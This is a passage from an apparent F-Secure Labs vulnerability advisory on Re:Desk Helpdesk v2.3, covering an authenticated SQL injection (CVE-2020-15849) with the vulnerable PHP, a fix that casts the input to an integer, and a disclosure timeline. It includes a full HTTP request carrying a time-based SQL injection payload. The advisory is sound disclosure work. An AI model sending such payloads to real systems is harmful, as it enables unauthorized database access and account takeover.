</ul><p><span style="font-size: medium;">The exploit code can be found at <a title="https://github.com/FSecureLABS/Re-Desk-v2.3-Vulnerabilities" href="https://github.com/FSecureLABS/Re-Desk-v2.3-Vulnerabilities">https://github.com/FSecureLABS/Re-Desk-v2.3-Vulnerabilities</a>. It is not included in this advisory due to the size of the exploit code.<br></span></p><p>Note that changing the MySQL database type may have unintended effects which may prevent new attachments from being saved to the table. It is possible to reverse this change after exploitation, again via SQL injection. However during testing this was observed to cause issues under some circumstances.</p><p>The screenshot below shows the above PoC in action:</p><p><img class="leftAlone" title="" src="assets/Uploads/final-unauth-sqli-file-upload-proof5.png" alt="final unauth sqli file upload proof5"></p><h3><span style="text-decoration: underline;">CVE-2020-15849 - Authenticated SQL Injection</span></h3><p>An authenticated SQL injection vulnerability exists within the <strong>SettingsController</strong> controller (<strong>protected/controllers/SettingsController.php</strong>), in the <strong>actionEmailTemplates()</strong> method. The code block below shows the vulnerable <strong>account_id</strong> parameter. No input validation or input sanitisation is performed here:</p><pre>public function actionEmailTemplates()<br>{<br> foreach ($_REQUEST['templates'] as $template_code =&gt; $template_data)<br> {<br>  /** @var EmailTemplates $template */<br>  <strong>$template = EmailTemplates::model()-&gt;findByPk(array('template_code' =&gt; $template_code, 'lang_code' =&gt; Yii::app()-&gt;language, 'account_id' =&gt; $template_data['account_id']));</strong><br>  $template-&gt;setAttributes($template_data);<br>  $template-&gt;save();<br> }<br><br> Yii::app()-&gt;user-&gt;setFlash('success', _t('changes saved'));<br><br> $this-&gt;redirect($this-&gt;createUrl('/settings/index', array ('section' =&gt; 'email_templates')));<br>}</pre><p><br>A malicious actor with access to an administrative Re:Desk Helpdesk account could abuse this vulnerability to recover sensitive data from the application's database, allowing for authorization bypass by means of modifying password reset tokens stored in the database and command execution as demonstrated above.</p><p>The following GET request can be used to execute MySQL's <strong>sleep()</strong> function, causing the application's database to pause for five seconds. This endpoint requires authentication as a Re-Desk admin:</p><pre>GET /settings/emailTemplates?templates%5Bnew_message%5D%5Baccount_id%5D=1%3b+select+sleep(5)%3b-- HTTP/1.1<br>Host: 192.168.56.102<br>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: http://192.168.56.102/ticket/index?filter=&amp;selector=open<br>Connection: close<br>Cookie: PHPSESSID=VALID_SESSION<br>Upgrade-Insecure-Requests: 1<br>Cache-Control: max-age=0</pre><h4><span style="text-decoration: underline;">Interim Workaround</span></h4><p><br>The following modifications can be made to the actionEmailTemplates method of the <strong>SettingsController</strong> controller (<strong>protected/controllers/SettingsController.php)</strong>:</p><pre><strong>$account_id = (int) $template_data['account_id'];</strong><br>$template = EmailTemplates::model()-&gt;findByPk(array('template_code' =&gt; $template_code, 'lang_code' =&gt; Yii::app()-&gt;language, 'account_id' =&gt; $account_id));</pre><p>This code block casts the <strong>account_id</strong> parameter to an integer. This prevents arbitrary SQL queries from being executed through the <strong>findByPk()</strong> method.</p><h1><span style="text-decoration: underline;">Credit</span></h1><p>These vulnerabilities were identified by Hannay Al-Mohanna of F-Secure Consulting.</p><h1><span style="text-decoration: underline;">Disclosure Timeline</span></h1><table>
<tbody>
<tr>
<td><strong>Date</strong></td>
<td><strong>Summary</strong></td>
</tr>
<tr>
<td> 11/05/2020</td>
<td>Vendor notified via customer contact form on official website. No response received.</td>
</tr>
<tr>
<td> 18/05/2020</td>
<td>Follow up via email. No response received.</td>
</tr>
<tr>
<td> 11/06/2020</td>
<td>Follow up via email. No response received.</td>
</tr>
<tr>
<td> 11/08/2020</td>
<td>Follow up via email. No response received.</td>
</tr>
<tr>
<td>29/09/2020</td>
<td> Advisory published.</td>
</tr>
</tbody>
</table><h1><span style="text-decoration: underline;">References</span></h1><ul>
<li>Re:Desk version 2.3 trial download:</li>
<ul>
<li><a title="https://www.re-desk.com/download-help-desk-software.html" href="https://www.re-desk.com/download-help-desk-software.html">https://www.re-desk.com/download-help-desk-software.html</a></li>
</ul>
<li>Yii Framework: Business Rules:</li>
<ul>
<li><a title="https://www.yiiframework.com/doc/guide/1.1/en/topics.auth#using-business-rules" href="https://www.yiiframework.com/doc/guide/1.1/en/topics.auth#using-business-rules">https://www.yiiframework.com/doc/guide/1.1/en/topics.auth#using-business-rules</a></li>
</ul>
<li>Symphony's ExpressionLanguage component, a potential candidate to reduce the special risks inherent to SQL injection affecting applications based on version 1.1 and below of the Yii framework:</li>
<ul>
<li><a title="https://symfony.com/doc/current/components/expression_language.html#how-can-the-expression-engine-help-me" href="https://symfony.com/doc/current/components/expression_language.html#how-can-the-expression-engine-help-me">https://symfony.com/doc/current/components/expression_language.html#how-can-the-expression-engine-help-me</a></li>
</ul>
<li>CVE-2020-15487:</li>
<ul>
<li><a title="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15487" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15487">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15487</a></li>
</ul>
<li>CVE-2020-15849:</li>
<ul>
<li><a title="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15849" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15849">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15849</a></li>
</ul>
<li>CVE-2020-15488:</li>
<ul>
<li><a title="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15488" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15488">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15488</a></li>
</ul>
</ul>
      </div>
      <div class="social-share">
        <p><span class="content-type">Share</span></p>
        <ul class="social">
  <li class="facebook"><a href="http://www.facebook.com/sharer.php?u=https://labs.f-secure.com/advisories/redesk-v2-3-multiple-issues/" target="_blank">Share on Facebook</a></li>
  <li class="twitter"><a href="https://twitter.com/share?url=https://labs.f-secure.com/advisories/redesk-v2-3-multiple-issues/&text=Re:Desk v2.3 - Multiple Issues" target="_blank">Share on LinkedIn</a></li>
  <li class="linkedin"><a href="http://www.linkedin.com/shareArticle?url=https://labs.f-secure.com/advisories/redesk-v2-3-multiple-issues/&title=Re:Desk v2.3 - Multiple Issues" target="_blank">Share on Twitter</a></li>
</ul>

      </div>
    </div>
    <div class="col4">
      

      
    </div>
  </section>

  <section class="section">
    <div class="container">
      <div class="col12">
        <p>&nbsp;</p>
      </div>
    </div>
  </section>


    </div>

    <footer class="foot">
	<div class="container">
    <div class="footer-flex-wrap">
     <p class="logo"><img src="https://labs.f-secure.com//themes/labs/img/fs-labs-logo-white.svg" alt="F-Secure" width="180" height="60"></p>
      <ul class="top-menu">
        <li><a href="/advisories/redesk-v2-3-multiple-issues/#top" class="btn-gototop">Top</a></li>
        
        <li class="link"><a href="https://www.f-secure.com/en/consulting/contact">Contact</a></li>
        
        
      </ul>
   </div>
   <hr/>
    <div class="col5 suf1 foot-about">
      <p>F-Secure provides specialist advice and solutions in all areas of cyber security, from professional and managed services, through to developing commercial and open source security tools.  </p>
    </div>
    <div class="col3">
      <ul class="footer-list no-margin">
        
        <li><a href="/publications/ti-report-lazarus-group-cryptocurrency-vertical/">Threat Intelligence Report: Lazarus Group Campaign Targeting the Cryptocurrency Vertical</a></li>
        
        <li><a href="/publications/the-fake-cisco/">The Fake Cisco</a></li>
        
        <li><a href="/publications/u-booting-securely/">U-Booting securely</a></li>
        
      </ul>
    </div>
    <div class="col3">
     <ul class="footer-list">
      
      <li><a href="/blog/prelude-to-ransomware-systembc/">Prelude to Ransomware: SystemBC</a></li>
      
      <li><a href="/blog/attack-detection-fundamentals-2021-azure-lab-3/">Attack Detection Fundamentals 2021: Azure - Lab #3</a></li>
      
      <li><a href="/blog/attack-detection-fundamentals-2021-azure-lab-2/">Attack Detection Fundamentals 2021: Azure - Lab #2</a></li>
      
    </ul>
  </div>
</div>
<div class="end">
 <div class="container">
  <hr/>
  <div class="footer-flex-wrap">
   <p class="copyright">Copyright &copy; 2021 F-Secure</p>
    <ul class="social">
      
      <li class="linkedin for-footer"><a href="https://www.linkedin.com/showcase/28493188" target="_blank">Connect with us on LinkedIn</a></li>
      
      
      <li class="twitter for-footer"><a href="https://twitter.com/fsecurelabs" target="_blank">Follow us on Twitter</a></li>
      
      
      <li class="github for-footer"><a href="https://github.com/fsecurelabs" target="_blank">Follow us on GitHub</a></li>
      
    </ul>
 </div>
</div>
</div>
</footer>

    <script src="/themes/mwr/js/min/jquery-3.5.1.min.js" id="jqueryscript"></script>

    
    <script src="/themes/mwr/js/min/slides.min.js"></script>
    

    <script src="/themes/mwr/js/min/scripts.js?20190917" id="pagescripts"></script>

    <script type="application/ld+json">
    { "@context" : "http://schema.org",
      "@type" : "Organization",
      "name" : "F-Secure Labs",
      "url" : "https://labs.f-secure.com",
      "logo" : "https://labs.f-secure.com/themes/labs/img/fs-labs-logo-white.svg",
      "sameAs" : [
          "https://twitter.com/fsecurelabs",
          "https://www.linkedin.com/showcase/28493188"],
      "contactPoint" : [
        { "@type" : "ContactPoint",
          "telephone" : "+441256300920",
          "contactType" : "customer service"
        } ]
    }
    </script>
</body>
</html>
